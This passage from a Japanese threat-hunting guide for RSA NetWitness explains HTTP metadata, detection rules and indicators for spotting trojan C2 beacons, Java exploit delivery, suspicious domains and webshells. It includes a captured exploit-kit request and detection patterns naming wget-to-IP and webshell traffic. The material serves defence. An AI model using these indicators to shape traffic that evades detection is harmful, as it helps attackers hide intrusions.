|action |リクエストメソッド（ 'get' 'post'など）
|ad.computer.src | 'NTLMSSP'承認のホスト資格情報
|ad.domain.src | 'NTLMSSP'認証からのドメイン資格情報
|ad.username.src | 「NTLMSSP」認証からのユーザー資格情報
|alert.id | HTTPヘッダーの異常
|alias.host |リクエスト 'HOST：'ヘッダー
|alias.ip | IPv4の場合は 'HOST：'ヘッダーを要求する
|alias.ipv6 | IPv6の場合は 'HOST：'ヘッダーを要求する
|analysis.service| （オプション）高度なhttp分析特性
|attachment | POSTリクエストで提出されたファイル名
|client |リクエスト 'USER-AGENT：'ヘッダー
|content | 'CONTENT-TYPE'ヘッダー
|directory |リクエストディレクトリ
|error |レスポンスステータスコード（2xxでない場合）
|extension |要求ファイル名の拡張子
|filename |リクエストファイル名
|http.request | （非標準）（オプション）要求ヘッダーの種類
|http.response | （非標準）（オプション）応答ヘッダータイプ
|ioc |高度な分析による妥協の指標（オプション）
|language |レンジャーヘッダーの言語
|orig_ip |プロキシクライアントのIPアドレス
|password | 「基本」認証からのパスワード認証情報
|query |クエリ文字列を要求する
|referer |リクエスト 'REFERER：'ヘッダー
|req.uniq | （非標準）（オプション）要求ヘッダー値
|resp.uniq | （非標準）（オプション）応答ヘッダー値
|server |応答 'SERVER：'ヘッダー
|service | 80
|url | （非標準）（オプション）完全リクエストURL
|username | ベーシック認証からのユーザー認証情報

**http.lua** パーサーは、明示的なプロキシHTTP要求を識別し、そのメタデータをanalysis.serviceに登録します。
パーサーは、前述の **http_lua_options.lua** ファイルで設定されたキーの下でUser-Agentを見つけて登録します。

前述のHTTPヘッダーロジックを有効にした後で、ヘッダーをメタデータとして取得したので、追加のメタデータを適用してHTTPセッションを細かく調べることができます。
最近のWebブラウザでは、要求を行うときに6つ以上のHTTPヘッダーが使用されます。
これらのヘッダーの一般的な例は、 **Accept、Accept-Encoding、Accept-Language、Cache-Control、Connection、Host、Referer** および **User-Agent** です。
このようにして、要求を行った人とマシンを分離することができます。

|サービス特性メタデータ|説明|
|:---:|:---|
|two http headers| 2つのHTTPヘッダー
|three http headers| 3つのHTTPヘッダー
|four http headers| 4つのHTTPヘッダー
|four or less headers| 4つ以下のHTTPヘッダー
|six or less headers| 6つ以下のHTTPヘッダー

たとえば、以下に表示されるトロイの木馬は、HTTP POSTメソッドを使用してC2にデータを送信します。
GETメソッドは、データを受信するために使用されます。
したがって、2つのHTTPセッションでリダイレクトされるコマンドシェルの入力と出力があります。
以下に示すように、POSTメソッドはContent-Lengthヘッダーを必要とします。
このヘッダーは、この例では、存在し、青い矢印で示されています。
ただし、送信する4096バイトがない場合でも、POSTごとに4096バイトの静的な値です。
赤い矢印は、HTTP要求ヘッダーの終わりと本文の末尾までの本文の始まりを示します。
明らかに、これは4096バイトのペイロードではありません。
**http.lua** パーサーのメタデータを使用して、これらのタイプの接続をさらに探すためのクイック検出ルールを作成することができます。

![Figure 6. MSU Trojan Beacon](https://community.rsa.com/servlet/JiveServlet/downloadImage/102-62341-232-466535/MSU_Trojan_543x332.png)

```
Service = 80 &&
http.request = ‘Content-Length’ &&
req.uniq = ‘4096’ &&
analysis.service = ‘six or less headers‘ &&
analysis.service != ‘four or less headers’ &&
size = L-4096
```

MSU_rat Luaパーサーが存在しない場合は、アプリケーションルールをすばやく作成して、数分でエンタープライズ全体にプッシュできます。
完全な検出パーサーを作成し、有効性をテストするのに時間はかかりません。
この特定のケースでは、環境内にこのトロイの木馬のいくつかの亜種があり、すべてが異なるドメインに向かっています。
 HTTPプロトコルをこの細かさで分析することで、アナリストはトロイの木馬の亜種をすぐにturn aroundして検出することができました。

これは純粋に既存のメタデータに基づいて妥協の指標を作成する例を表しています。
これは、従来のIDS/IPSの意味でのシグネチャと同等ではなく、トラフィックが正当であるか不正であるかを判断するためにアナリストにデータを確認する必要があります。
利用可能なすべてのトラフィックがあるため、アナリストはアクターによって実行されたアクションを再構築することができました。
これは、NetWitnessと共通のIDS/IDPの主要な差別化要因であり、後者では不可能です。
IDS/IDPではデバイスにシグネチャが適用された以降のデータしかパターンマッチングできないからです。

## User-Agent

HTTPトロイの木馬は、通常のHTTPトラフィックと混同しようとします。
User-Agentは、アクティブなWebアプリケーションのアプリケーション識別子です。
インターネットエクスプローラの場合、一般的にオペレーティングシステムとそのブラウザの拡張機能がインストールされています。
トロイの木馬は、User-Agentでハードコードされているか、またはWindowsレジストリからUser-Agentを読み込みます。
マルウェアによって使用される人気のあるUser-Agentが以下に表示されています。

```
Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)
```

このUser-Agentは、オペレーティングシステムがWindows XP 32ビットで、Internet Explorer 6.0でセキュリティセンターバージョン1のService Pack 2を実行していることを示しています。
このサービスパックは2004年にリリースされました。
実際のユーザーが10年以上前のオペレーティングシステムとブラウザでブラウジングしている可能性は非常に低いです。
このUser-AgentでWebリクエストを生成するアプリケーションは、おそらく人間によるものではなく、何らかの自動化されたリクエストを表します。
http.luaパーサは、選択したキーにメタを登録するように設定できます。
デフォルトでは、メタはクライアントキーに登録されます。
以下のロジックは、ユーザーエージェントを分類するために適用されます。
このタイプのロジックは、ライブコンテンツ全体に存在し、プロトコルや動作アーチファクトによって興味深いトラフィックをセグメント化しようとします。

|サービス特性メタデータ|説明|
|:---:|:---|
|http short user-agent | 56バイト未満のUser-Agent
|http long user-agent | 56バイト以上76バイト未満のUser-Agent
|http max length user-agent  | 256バイト以上のUser-Agent
|http short user-agent ie | 'IE 3-11'を含む56バイト未満のUser-Agent
|http no user-agent | HTTPリクエストにUser-Agentは存在しません
|http nonstandard mozilla | Mozillaは含まれているが、バージョン3.0, 4.0、または5.0が含まれていないUser-Agent
|http not good mozilla | 標準のMozilla識別子のないUser-Agent
|http java | Java仮想マシンによって生成されるUser-Agent
|http suspicious user-agent| 共通の書式設定間違いを持つUser-Agent
|http wget direct to ip | 直接IPアドレスを指定しているwgetアプリケーション

## ホスト名

DNSとドメイン名は、しばしばインターネットのバックボーンと呼ばれます。
rsa.comなどのフレンドリ名は、レイヤ3ルーティングインフラストラクチャで理解できるIPアドレスに解決されます。
また、C2でのトロイの木馬、ポート計算、アクションのシグナル通知などの悪意のある目的にも使用されます。
すでに説明したメタデータを使用して、データセットを管理可能な動作のバケットに編成する場合、アナリストは一般に、NetWitnessのalias.hostレポートを参照して、トリアージ動作を開始する必要があります。

アナリストは、 'go0gle.com'のようなスペルミス、 'jhkhajdsfgasdkfhk.info'のようなナンセンスドメイン、 'australiantestnew233s.info'のような一見無害な名前を探す必要があります。
これらのドメインを抽出してから、Virustotal、Robtex、Bulk SEO Toolsのようなオンラインツールを使用して実行し、最近の登録日や偽の登録者情報を検索することをおすすめします。
これを念頭に置いて、Liveコンテンツには疑わしいドメインを識別するためのロジックが組み込まれており、アナリストは特定の時間に分析しているデータの量を減らしてデータセットを掘り起こすことができます。

|サービス特性メタデータ|説明|
|:---:|:---|
|suspiciously named domain| Google、Appleなどが含まれていて、.google.comや.apple.comで終わらないドメイン
|hostname consecutive consonants| 5つ以上の連続した子音または数字、または4つの連続した子音または数字の2つのグループを探している正規表現。DGA（ドメイン生成アルゴリズム）を発見するのに便利です。
|dynamic dns host| ダイナミックDNSプロバイダのサブドメインであるalias.hostエントリ
|dynamic dns server| 既知の動的DNSサーバと一致するalias.hostエントリ
|http direct to ip| IPに直接接続するHTTPリクエスト。 ホスト：10.0.0.1など。
|tld_is_not_com_org_net | com、orgまたはnetのいずれでもないtld。

## Java VM

Java Virtual Machine（JVM）は、脆弱性に関する調査の対象となっており、マルウェアの配信には好都合です。
オラクルが最新バージョンに組み込んでいるセキュリティの向上があっても、多くの企業は、依然としてビジネスに依存しているサポートされていないアプリケーションのために、長年の実装に悩まされています。
これにより、サイバー犯罪者はまれに閉鎖されるアプローチの道を開くことができます。

私たちの目的のために、悪用とマルウェアの配信に関連する3つの主要コンポーネントの動作を分析します。
私たちはJAR（Java ARchive）、Javaクラス、Javaアプレットに興味があります。
アプレットは、通常、ブラウザのコンテキストで実行される小さなスクリプトです。
エクスプロイトアプレットは一般に、デコードキーやアプレットによって設定された別の特別なパラメータなど、特定の起動プロパティを使用してJARまたはクラスファイルを参照します。
オペレーティングシステムとJavaバージョンの2つの例があります。
これらは通常、適切なエクスプロイトのプロファイルと配信に使用されます。
これが、JVMがこれらのClassまたはJARファイルを取得し、アプレットによって指定されたパラメータで起動するところです。
JVMの興味深い成果物は、デフォルトで、そのUser-Agentが要求を完了するJavaのバージョンであるということです。

```
GET /links/cleared-brought_nowhere.php?dikrsiy=3536073536&likv=3333&lmgfyflc=oocaw&cmkmtfz=cnsxp HTTP/1.1
accept-encoding: pack200-gzip, gzip
content-type: application/x-java-archive
User-Agent: Mozilla/4.0 (Windows XP 5.1) Java/1.6.0_32
Host: 188.165.4.201
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Via: 1.1 localhost.localdomain
```

このインジケータを使用して、一定期間インターネットに到達するJVMアクティビティのみを絞り込むためのルールをいくつか作成できます。
次の表に、JVMに関連するメタデータを示します。

|メタデータ|メタキー|説明|
|:---:|:---:|:---|
|http java | analysis.service| HTTP経由のJVMリクエスト
|java exe | ioc | `direction = outbound`および`filetype = windows executable` を使用したHTTP経由のJVMリクエスト
|java pdf | ioc | `direction = outbound` および `filetype = pdf` を使用したHTTP経由のJVMリクエスト
|http possible exploitkit| ioc | `direction = outbound`で、認識されたファイルタイプがないHTTP経由のJVMリクエスト

インターネットへのすべてのJVMおよびGETメソッド要求を分析する必要があります。
多くの場合、配信されるマルウェアはエンコードされず、JARまたはClassファイルの後の要求は実行可能ファイルになります。
Forensic Fingerprintでこのメタデータを見つけることができます。
RSAリサーチチームは、alias.hostとtldを開くと、関連するドメインをすばやくスキャンして、異常なものを探すことができることがわかりました。
JVMエクスプロイトのペイロードのすべてが明確になるわけではありません。
エクスプロイトJARには、ペイロードをサーバーからダウンロードした後に解凍するためのコードが含まれています。
これらのセッションがシングルバイトのXORキー以外でエンコードされている場合、パーサーは実行可能ファイルを検出しません。
これは単にバイナリデータの「ブロブ」に過ぎません。
これは、Javaトラフィックを分析するための重要な指標です。
小さなJARまたはClassファイルがダウンロードされた後にペイロードを識別できない場合は、JARを深く掘り下げたり、エンコーディングスキームのペイロードを調べる必要があります。

以下の例では、簡単なXORエンコーディングスキームでエクスプロイトペイロードが配信されました。
JARはペイロード全体にDWORD XORキーを使用していたため、NetWitnessによってネイティブに識別されませんでした。
理論的にパーサーは、これらを検出するために使用できます。
ただし、キーの長さを追加すると、処理量は指数関数的になります。
これらの符号化方式は、XORキーがPEヘッダーであると推定されるもののパディングセクションで繰り返されることがあるため、手動で簡単に検出できます。

![Figure 10. Encoded Payload](https://community.rsa.com/servlet/JiveServlet/downloadImage/102-62341-232-466518/EncodedPayload_440x307.png)

![Figure 11. Decoed Payload](https://community.rsa.com/servlet/JiveServlet/showImage/102-62341-232-466599/DecodedPayload_438x288.png)

この例のようにペイロードを抽出するのは必ずしも簡単ではありません。
しばしば、JARの個々のクラスファイルをデコンパイルして検査しなければならず、おそらくデバッグして修正して、使用されているエンコーディングまたは暗号化アルゴリズムを発見する必要があります。
マルウェア作者は、エンコードされたマルウェアをデコードして実行するために、ノンスを用いるワンタイムキーを生成することさえあります。
これは、アナリストや研究者にとって、完全なパケットキャプチャが必須であるもう一つの理由です。

## その他のHTTPインジケータ

悪質なソフトウェアを見つけるために組み合わせることができる、HTTPの多くの指標、動作、技術的側面があります。
ライブコンテンツパーサーは、アナリストのためのインテリジェントな方法で、最も一般的な妥協の指標[IOC]を自動的に組み込みます。
これは、HTTPデータセットでのハンティングに使用されるIOCの明確なリストではありませんが、調査の出発点となります。

**http with base64** と **http with binary** には特別な言及が必要です。
これは、通常のHTTPトラフィックのように見えるようにC2に送り返されるデータを難読化するための一般的な手法です。
Base64データは、素早くデコードして、内部にあるもの、たいていはバイナリデータを発見することができます。
これらのセッションに含まれるデータが適切に解読されない場合は、トロイの木馬内に特別なBase64変換テーブルが定義されている可能性があります。
同様に、バイナリデータは単純なシングルまたはマルチバイトのXORでない限り、構造を発見するためにバイナリ解析とプロトコルリバースエンジニアリングを必要とするランダムな非ASCIIデータのように見えます。
多くの正当なアプリケーションでは、これらのメソッドを使用してデータを転送しますが、アナリストがデータセットを使用した経験があれば、簡単に無視できます。

|サービス特性メタデータ|説明|
|:---:|:---|
|http with base64  |本文にBase64でエンコードされたデータを含むHTTP
|http with binary |本文にバイナリデータを持つHTTP
|watchlist file fingerprint| Windows実行ファイル、JARなどのマルウェアで一般的に使用される実行可能ファイル形式
|watchlist file extension | .exe、.php、.zipなどのマルウェアで一般的に使用される実行可能な拡張子
|http explicit proxy request | Requestメソッドの後にプロトコルと完全なURLを要求する明示的なプロキシ要求の試み
|http long query | 256バイト以上のクエリ文字列
|http suspicious connect |ヘッダーが4つ未満で、ユーザーエージェントがないHTTP CONNECTメソッドを使用するセッション
|http response filename exe  | exeで終わるインライン・ファイル名を持つHTTP要求に対するサーバーの応答
|http webshel​​l | GETおよびPOSTスタイルのWebシェル用の各種インジケータ
|http webshell no error | HTTPサーバーの応答エラーを生成しないGETおよびPOSTスタイルのWebシェル用のさまざまなインジケータ
|http webshell error | HTTPサーバーの応答エラーを生成するGETおよびPOSTスタイルのWebシェル用のさまざまなインジケータ
|http post no get missing content-length | Content-Length HTTPヘッダーを含まないことによってRFCに違反するHTTP POST要求
|http post no get low header count not flash |ヘッダーが6未満でUser-Agentに'shockwave flash'を含まないPOSTリクエスト
|http post no get short filename suspicious extension |実行可能な拡張子を持つ3バイト以下のファイル名に対するHTTP POST要求
|direct to ip one char php | 1文字のPHPスクリプトを照会するダイレクトIPへのHTTPリクエスト

![Figure 12. HTTP with Base64 Encoded Data in Body](https://community.rsa.com/servlet/JiveServlet/downloadImage/102-62341-232-466480/HTTP_base64_639x476.png)

![Figure 13. HTTP with Binary Data in Payload](https://community.rsa.com/servlet/JiveServlet/downloadImage/102-62341-232-466488/HTTP_binary_649x488.png)

## HTTPハンティングのまとめ

![Figure 14. Netwitnes Hunting Theory](https://community.rsa.com/servlet/JiveServlet/downloadImage/102-62341-232-466444/NW_HuntingTheory_253x278.png)

### 期間

NetWitnessでのハンティングの第一歩は、おそらく最も重要なステップです。
アナリストは、さまざまなメタカテゴリを使用して掘削を開始する前に、まず「私は何時を見ていますか？」という質問に答える必要があります。
アナリストは、ほとんどの従来のフォレンジックツールとは異なり、NetWitnessは常にデータをキャプチャしており、ほぼリアルタイムで結果を提供していることを認識している必要があります。
過去24時間のデフォルト値を選択してブラウザをリフレッシュすると、過去24時間の時間オフセットが変更されます。
たとえば、午前9時に調査を開始してWHERE句を使用して最後の24時間を選択し、正午に昼食に行った場合、コンピュータに戻ってNetWitnessにログインして検索を続行すると、過去24時間は私が戻った時から元の午前9時+ 24時間よりも進んでいます。
この時間の問題の矢印は、相対的な時間オフセットではなく、絶対的な時間オフセットを選択することによって解決されます。
簡単に言えば、アナリストは、過去1時間、過去3時間などの相対オフセットを使用するのではなく、静的な時間ブロック全体（たとえば、昨日）を分析する必要があります。

### 方向性

次のコンセプトは方向性です。
どのような種類の脅威を探していますか、どのような方向性がありますか？
トロイの木馬C2通信を探しているなら、彼らはネットワーク内にあり、外部リソースに接続していると仮定します。
私たちはアウトバウンド方向を選択します。
webshellの活動を探しており、traffic_flow_options.luaを適切に設定している場合は、インバウンド方向を選択します。
最後に、ファイアウォールポリシーや侵入されたDMZマシンからのアクセスを奪うための何らかの内部リレーを探している場合、我々はラテラルムーブメントを選択します。

### サービス

絶対時間オフセットを選択して方向を選択したので、分析するサービス（この場合はHTTPまたはservice = 80）を選択できます。
データセットを関連するデータのみに絞り込み、実際の分析を開始できます 。

### 分析開始

この後の最初のクエリは、データセットをより小さなバケットに分割して、より詳細に調べることを目的としています。
これらは私たちの技術的側面と行動の問い合わせです。
我々はまだ妥協の指標を探しているわけではない。
むしろ、行動（メソッドの使用法など）や技術的側面（短いユーザーエージェントストリングやウォッチリストファイル拡張など）に基づいてトラフィックを選択しています。

たとえば、HTTPなどのよく知られたプロトコルでの秘密双方向通信を探しているときは、HTTPメソッド分析に戻ることができます。
ほとんどの環境でHTTP POSTはHTTP GETの約10％です。
これを知って、私たちは効果的に **http post no get** を照会することができます。
現在、トラフィックの約90％を現在無益です。

サービス特性メタキーは、**http post no get** の前のクエリなど、行動的および技術的な側面のクエリから始めます。
スループットとデータセットの特定の側面に応じて、適切でないか疑わしいものを見つける前に少し深く掘り下げなければならないかもしれません。
アナリストは、サービス特性メタキーを使用して、人間が生成した動作のように見える部分を切り出し、マルウェアが示す自動動作に焦点を当てることができます。
以前は、最新のブラウザでは6つ以上のHTTPヘッダーが使用されていました。
したがって、6つ以下のヘッダーでHTTPセッションを掘り下げると、これらのセッションが削除され、より興味深いものが残されます。

ここからは、以前に説明したHTTPの側面を調べ、正常な動作であることがわかっていることに基づいて説明できないセッションを探します。
リファラーなしでHTTP POSTが表示されたら、どうやってそれにアクセスしましたか？
私たちが奇妙なUser-Agentに遭遇した場合、そのアプリケーションは何であると言いますか？
信頼できるベンダーと同様の奇妙なドメイン名が見つかりましたが、ドメインがそのベンダーによって登録されていない場合はどうなりますか？
多くの場合、ネットワークの可視性のみでは、トラフィックの原因を見つけるまで、これらの質問に答えることは困難です。

### 深層分析

潜在的に外れているようなものを発見すると、実際の調査が始まります。
アクティビティが発生している期間とホスト数はどのくらいですか？
リース時間の短いDHCP環境では、DHCPログが利用可能かどうかを判別するのが難しくなります。
たとえば、アナリストがfoo.comと不審なHTTP通信を見つけた場合、アナリストは宛先IPに注意して新しいInvestigatorウィンドウを開く必要があります。
次に、宛先IPを取得し、`ip.dst = 123.123.123.123 || ip.src = 123.123.123.123 || alias.ip = 123.123.123.123`を照会します。
これにより、コミュニケーションの可能なイニシエータの両面が得られます。
C2 IPからのインバウンドwebshellアクセスと、それにビーコンを送信するトロイの木馬が存在する可能性があります。

```
注：アナリストは、このドリルダウンアクティビティをより簡単に実行できるようにコンテキストアクションを追加することもできます。
```

### 例

次の例では、トロイの木馬Rekafが発するビーコンを調べて、それが生成するメタデータの一部を観測しています。
NetWitnessのテキストビューに表示されるセッションは、次のとおりです。

![Figure 15. Rakaf Beacon](https://community.rsa.com/servlet/JiveServlet/downloadImage/102-62341-232-466538/Rekaf_Beacon_659x469.png)

以下のセッション特性が観察されました。

![Figure 16. Rakaf Session Characteristics](https://community.rsa.com/servlet/JiveServlet/downloadImage/102-62341-232-466598/Rekaf_Session_530x282.png)

送受信データの総量は5KB未満ですが、内部から外部に対して受信サイズをはるかに超えるサイズのデータを送信しています。
それ以上のことはわかりませんが、これはトロイの木馬の通信特性として非常に興味深いものです。

![Figure 17. Rakaf Service Characteristics](https://community.rsa.com/servlet/JiveServlet/downloadImage/102-62341-232-466586/Rekaf_Service_570x335.png)

このメタキーを見れば状況はさらに明らかになります。
このリクエストにはPOSTメソッドがありますがGETメソッドはなく、Referrerヘッダーが含まれていないことがわかります。
ブラウザを使った一般的な操作ではこのような挙動はあり得ません。
また、Windowsレジストリに格納されているデフォルトのUser-Agentと思われる短いUser-Agentと、6つのHTTPヘッダーがあることもわかります。
さらに2つのキャッシュ・ディレクティブとクッキーが存在しないということは、この通信がユーザー操作によって行われたものではなく、プログラムによって行われた可能性が高いことを示しています。
それを示す最も明白なインジケータは、リクエストの本文内のバイナリペイロードです。
すべての文字がASCIIの範囲にあるわけではないので、NetWitnessは印刷不可能な文字を '.' としてレンダリングします。

ESAのEvent Stream Analysisには、アナリストがHTTPでのハンティングに適用するロジックと非常によく似たロジックが含まれています。
Rekafについては、次の図を参照してください。

![Figure 18. ESA C2 Detection](https://community.rsa.com/servlet/JiveServlet/downloadImage/102-62341-232-466450/Rekaf_ESA_578x635.png)

ESAアプライアンスは、定期的に送信HTTPトラフィックをデータセットに照会し、特定のスコアを生成し重み付けする機械学習アルゴリズムを適用します。
この方法ですべてのHTTP通信が評価され、スコアが発生します。
最も重大なインシデント・マネージャ・キューにインシデントが生成されます。
重大なインシデントを抽出するために必要なデータがすべてNetWitnessサービスから得られるわけではありません。
WHOISの情報はLiveから集められ、ドメインのエージングと期限切れの情報でスコアを高めます。
このタイプのシステムはアナリストを補強し、人間が行うよりも複数のセッションかつ長い期間にわたって分析します。
NetWitnessを検索する際には、単一のセッションや何らかの種類のビーコニングパターンが目立つように探しています。
ESAは、すべてのHTTPトランザクションの接続統計をメモリに保持し、人間には認識できないパターンを探します。
以下は、得点したカテゴリと説明のリストです。

|ESA 評価カテゴリ|説明|
|:---:|:---|
|Beacon Behavior| このソースIPとこのドメインとの間の通信が非常に規則的であるため、C&Cの疑いがあることを示します。
|Domain Age| レジストラの登録日に基づいて、このドメインが比較的新しいことを示します。
|Expiring Domain| ドメインがすぐに期限切れになる可能性が高いことを意味します。
|Rare Domain| 過去1週間、このネットワーク上でこのドメインに接続されたIPが比較的少ないことを示します。
|No Referers | このドメインにリファラ経由で接続するIPの割合が比較的低いことを示します。
|Rare User-Agent| まれなユーザーエージェントを使用しているドメインのIPの割合が高いことを示します。

最終スコアを生成するために使用された得点計算のより詳細なビューです。

![Figure 19. ESA C2 Detection Scoring Detail](https://community.rsa.com/servlet/JiveServlet/downloadImage/102-62341-232-466590/Rekaf_ESA_Scoring_637x726.png)

# SSL/TLS
